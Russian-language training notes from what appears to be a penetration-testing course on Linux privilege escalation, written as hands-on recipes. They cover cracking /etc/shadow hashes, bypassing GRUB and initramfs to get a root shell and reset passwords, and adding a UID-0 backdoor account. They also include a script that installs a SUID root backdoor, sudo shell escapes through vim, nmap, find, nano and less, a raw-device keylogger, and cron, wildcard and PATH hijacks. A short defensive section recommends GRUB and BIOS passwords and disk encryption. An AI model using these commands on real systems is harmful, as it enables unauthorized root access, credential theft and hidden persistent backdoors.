Занятие 1
Повышение привелегий - использование уязвимостей операционной системы и прикладного ПО для повышения полномочий в атакуемой системе
Кольца привелегий

Использование физического доступа:
Самое простое - вытащить из компа диск и подключить его к другому компьютеру

Использование ошибок администрирования:
Админ плохо сконфигурировал свой сервер и дал лишние привилегии пользователю
(Стандартные конфигурации по умолчанию достаточно безопасны)

Использование сервисов, которые обновлялись или не обновлялись

Атаки на ядро


Если пользователь получил права рута, то проще погасить систему полностью, ибо есть риск того, что атакующий мог хорошо спрятаться 

Список учетных записей лежит в /etc/passwd
User-ID:Password(раньше тут был хеш пароля):UID:GID:User_Info:/HomeDir:/bin/bash(Shell)
adduser/deluser
addgroup/delgroup
usermod
id
who
whoami
passwd

/etc/shadow - файл с именами пользователей и паролями
Login_Name:Encrypted_Password:days_since_last_change:

/etc/login.defs - файл содержащий сведения об алгоритме 

Перебор Хэшей
1) Хэши берем из файла /etc/shadow 
2) Определение типа хеша 
cat /etc/login.defs | grep ENCRYPT_METHOD
github.com/psypanda/hashID
onlinehashcrack.com/hash-iden
3) Готовимсловарь паролей
crackststion.net
wiki.skullsecurity.org/Passwords
github.com/danielmiessler/SecLists
4) Запуск утилит
./hashcat-cli64.bin -m $HASH_TYPE -a 0 crack.hash dict.txt
john --wordlist=dict.txt --rules shadow



Атака на grub
1) Перед загрузкой системы нажать на стрелку, что бы система не загрузилась сама
Если меню выбора нет, то зажимаем ESC во время загузки
2) Нажать "c" что бы войти в режим консоли
Теперь мы получили доступ ко всем дискам в режиме чтения!
3) ls	Получаем список дисков
4) ls <диск>
Ищем раздел с файловой системой "Filesystem type ext*"
5) ls (hd0,msdos5)/
Нашли файловую систему

Вывести /etc/shadow
1) set pager=1
Необходим, что бы данные не убежали за экран
2) cat (hd0, msdos5)/etc/shadow



Запустить линукс с флешки, даже если это запрещено в BIOS
1) ls
2) set root=(hd0,msdos1)
3) linux /vmlinuz ro root=/dev/sda2
4) initrd /initrd.img
5) boot



Запустится с рутом с флешки
1) set pager=1
2) ls
3) cat (hd0,1)/etc/shadow
Читаем файл с хешами паролей
4) set root=(hd0,1)
Устанавливаем раздел
5) linux /boot/vmlinuz-3.13.0-29-generic root=/dev/sda1
Выбираем файл с ядром и параметрами ядра
6) initrd /boot/initrd.img-3.13.0.29-generic
Выбираем файл с initrd
7) boot



Сразу зайти под рутом
1) Навести на основную систему ( не advanced options) 
2) Нажать 'e'
3) Заменить "ro quite splash" на "rw init=/bin/bash"
4) CTRL + X или F10
При запуске мы сразу получим bash от рута. После перезагрузки все будет по-прежнему



Поменяем пароль от пользователя
1) cp /etc/shadow /etc/shadow.orig 	
Делаем бэкап файла
2) passwd <user>
Меняем пароль
3) mount -o remount,rw /	
На случай если не можем записывать на диск
4) echo b > /proc/sysrq-trigger		
Перезагружаемся, так как обычный ребут не работает



Добавить backdoor пользователя (очень палевно, если за системой следят)
1) vim /etp/passwd
2) вставляем "tech:x:0:0:root:/root:/bin/bash"
3) passwd -d tech
Убираем пароль с пользователя (не так надежно)
4) passwd tech
Или ставим свой пароль 



ESC - выйти из консольного режима
e - изменение параметра загрузки
c - консоль grub



Если в GRUB (версии 1.98-2.02) стоит пароль, его можно обойти путем 28 нажатий на Backspace
На сайте есть ссылка на то, как это работает



Initramfs - файловая система, используемая для решения проблемы курицы-яйца (загружается первой)
Это маленькая версия линукса, которая содержит все необходимое для монтирования основной файловой системы и дальнейшей загрузки
Initramfs никогда не шифруетя! 



Заходим в Initramfs (Resque Shell) с правами рута
1) Выбираем режим 'e'
2) linux /boot/... root=hahahaha ro quite ...
Меняем значение root= на несуществующее
3) CTRL + X или F10 
4) ls /dev/sd*
Смотрим доступные диски
5) mount -t ext4 /dev/sda1 /root/
Перебираем все доступные диски, пока не примонтируется. Теперь у нас есть файловая система с правами рута



Меняем пароль через Initramfs
Способ 1
1) vi /etc/passwd
Вручную меняем пароль (не самый надежный способ)
Способ 2
1) chroot /root/
Меняем корневую директорию
2) passwd <login>
Теперь можем сменить пароль с помощью passwd



LUKS - стандарт шифрования дисков, используемый по умолчанию в разных дистрибутивах Linux

Раздел с загрузчиком, initrd и ядром часто остается незащищенным при использовании LUKS
Это позволяет добавить в initrd закладку, которая сохранит введенный пароль и отправит его атакующему



Защитные меры
1) Установка пароля на BIOS/UEFI, выбор приоритета загрузки, использование механизмов SecureBoot
2) Использование шифрования дисков
3) Установка пароля на GRUB 
	$grub-mkpasswd-pbkdf2
	Добавить в файл /etc/grub.d/00_header следующее:
	cat << EOF
	set superusers="John"
	password John grub.pbkdf2.sha512.10000.<...>
	EOF
	$sudo update-grub



Атака на thunderCLAP - позволяет получить доступ к оперативной памяти и выкачать ключи из макбука
thunderclap.io

Можно физически заморозить оперативную память и вытащить ее. После этого плашка вставляется в комп со специальным ПО
для извлечения данных из оперативной памяти Cold-Boot

Программатор материнской платы позволяет ставить очень устойчивые бэкдоры
github.com/Cr4sh/SmmBackdoor



Выполнение команд от имени другого пользователя
su - переключение пользователя в сеансе командной оболочки
sudo - выполнение команды от имени другого пользователя
/etc/sudoers - конфигурационный файл для команды sudo
visudo - безопасное изменение конфигурационного файла
sudo -l - список разрешенных команд через sudo



Типы файлов (ls -l)
f или -	Обычный файл
d 	Директория
p 	Именованный канал (средство межпроцессной коммуникации, например pipe. С одной стороны читает, с другой пишет. В памяти не лежит)
l	Символьная ссылка (перенаправляет запросы на чтение и запись по заданному пути. Создать: ln -s <путь> <имя>)
b 	Блочное устройство (позволяет взять hex дамп данных с жесткого диска в сыром виде)
c	Символьное устройство (выдает набор данных, по которым невозможна навигация. Используестя в рандомайзерах: xxd /dev/urandom)
s	Сокет (работает как сетевой порт, но с привязкой к файлу)



В папке proc можно менять параметры оборудования, к примеру, яркость монитора и т п
ls /proc | grep brightness 

pipe - переменная, которая не хранится в памяти. Запись и чтение должны быть одновременны

ln -s /etc/passwd link2
cat link2

С помощью символьных ссылок можно повысить привелегии
если назвать ссылку именем, которым воспольуется программа 

xxd /dev/urandom - прикольный генератор случайных данных на экране



Низкоуровневый кейлоггер
1) cd /dev/input/by-id
Переходим в директорию, где хранятся данные о переферии
2) ls
Выводим список устройств
3) sudo xxd <device>
Выводим на экран hex-дамп действий от устройства



Права доступа
На файл:
r(4) можно записать в файл
w(2) можно прочитать из файла
x(1) можно запустить файл
На директорию:
r(4) можно создавать, удалять, переименовывать файлы
w(2) чтение списка файлов в дириктории
x(1) прохождение через директорию



Еще один способ добавления/удаления прав
chmod ugo+wx	user/group/other + write/execute
chmod ugo-rx



Управление правами доступа
chmod	 изменение прав доступа
umask	 маска прав доступа (влияет на права новых файлов)
chown	 изменение владельца, доступна для суперпользователя
chgrp	 изменение группы владельца, пользователь может ставить только те группы, в которые он входит



Без права на чтение можно запускать бинарники, но не интерпретируемые скрипты (bash/python)

umask - вновь создаваемые файлы будут иметь права по алгоритму: 666 - umask=026 = 640

suid bit позволяет выполнять программы с правами хозяина 

Если на машине есть несколько аккаунтов, то лучше поставить на домашние папки права 750





Занятие 2
создаем копию bash с возможностью запускать с правами рута
cp /bin/sh /bin/suid_sh
chmod u+s /bin/suid_sh
/bin/suid_sh-p
id


find <путь в котором проводится поиск> 	
-path <путь> -prune -o			исключить путь
-user <name>				имя пользователя
-type f					тип файл
-perm -4000				есть право suid


Идентификатор процекссов
Real - идентификатор пользователя, который запустил программу
Effective - идентификатор пользователя, от имени которого запущена программа

man getuid
man <функция в языке> 	мануалы  есть и в  средствах языков программирования


#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
                                                                                                                  
int main()                                                                                                        
{                                                                                                                 
        printf("Real uid: %d\nEffective uid: %d\n", getuid(), getuid());                                          
        return 0;                                                                                                 
} 


Скрипт для установки SUID бэкдора. Запускать от рута

#!/bin/bash
SRC=$(mktemp -t XXXXXXX.c)
cat << EOF >> $SRC
#include <unistd.h>
int main()
{
	setreuid(geteuid(),geteuid())
	execve("/bin/ssh",0,0)
}
EOF
gcc $SRC -o /bin/backdoor
chmod u+s /bin/backdoor

sudo bash script.sh
Вуаля I AM ROOT



Capabilities 


sudo chattr +/-i file 	атрибут, который не позволяет с файлом ничего сделать (это защищает от окирпичивания при удалении всех файлов)
lsattr * 		показать атрибуты
sudo chattr +a file 	атрибут, позволяющий защитить файл от изменения, при этом дописывать можно (хорошо для логов)


Удаленный доступ к системе
Архитектура процессора 
Тип шелла
	Web-Shell
	Bind/reverse shell
	Non-interactive shell
	SSH (можно использовать как прокси)

Сбор информации
Дистрибутив и версия системы 
	/etc/issue
	/etc/*-release
Ядро ОС
	uname -a		важна дата компиляции (сработают эксплойты, которыые новее)
	ls -la /boot/		можно узнать версию сборки и проверить эксплойты на виртуалке перед настоящей атакой
Пользователи и их файлы
	/etc/passwd
	ls -la /home
	.bash_history
	.nano_history
	.mysql_history
	.ssh
	Бэкапы
Сетевое окружение
	ip neigh
	ss -tln			узнаем сервисы по портам
	netstat -tnlp
Задачи cron
	/etc/crontab
	/etc/cron.*
Работа в sudo
	sudo -l
SUID файлы
find / user root -perm 4000 -exec ls -ldb {} \;  >/tmp/suid


Автоматизированный сбор информации об уязвимостях
github
	diego-treitos/linux-smart-enumeration		скрипт собирает инфомацию об ошибках конфигурации
	LinEnum
	enumy
	postenum
	carlospolop/privelege-escalation-awesome-scripts-suite
Утилиты (дают много ложнх срабатываний)
	Lynis (lyni --pentest -режим для проведения аудтиа с теми правами, которе есть)
	Linux exploit suggester				
	Inspector
	local_exploit_suggester





Заняте 3
атаки на плохо сконфигурированные программы с праваим sudo
sudo -l 	показать команды, которые можно спользовать с sudo 
gtfobin.github.io	сайт с кучей эксплойтов к программам, на которые есть права sudo

vim:
	sudo vim
	>!sh
	I AM ROOT

nmap:	
	sudo nmap --interactive
	>!sh
	I AM ROOT

	TF=$(mktemp) echo 'os.execute("/bin/h")' > $TF sudo nmap --script=$TF
	I AM ROOT

ftp:
	!/bin/sh
	I AM ROOT

/usr/sbin/iftop:
	!
	sh
	I AM ROOT

/usr/bin/man:
	man man
	!/bin/bash
	I AM ROOT

/usr/bin/less:
	les /etc/services
	!/bin/bash
	I AM ROOT

/usr/bin/find:
	sudo find /etc/passwd -exec /bin/sh \;
	I AM ROOT

/usr/bin/nano:
	nano ^R^X
	reset; sh 1>&0 2>&0
	I AM ROOT

	nano -s /bin/sh
	/bin/sh
	^T
	I AM ROOT

apache2:
	sudo apache2 -f /etc/shadow
	получаем хеш рута!



Атаки на Cron
/etc/crontab
crontab.guru	сайт для наглядности задач cron
Если есть право на запись в этот файл, то мы можем подменить запускаемую программу на наш скрипт

Если cron испаользует wildcard (*), то мы можем подставить свои значения
Так-же если назвать файл, к примеру -l (арумент команд), то она выполнится, когда программа дойдет до нее

на rootme таск назвается ultra upload


Атака на PATH
можем изменить переменную PATH и добавить путь до контролируемой папки, что бы вместо настоящей программы запустился наш код

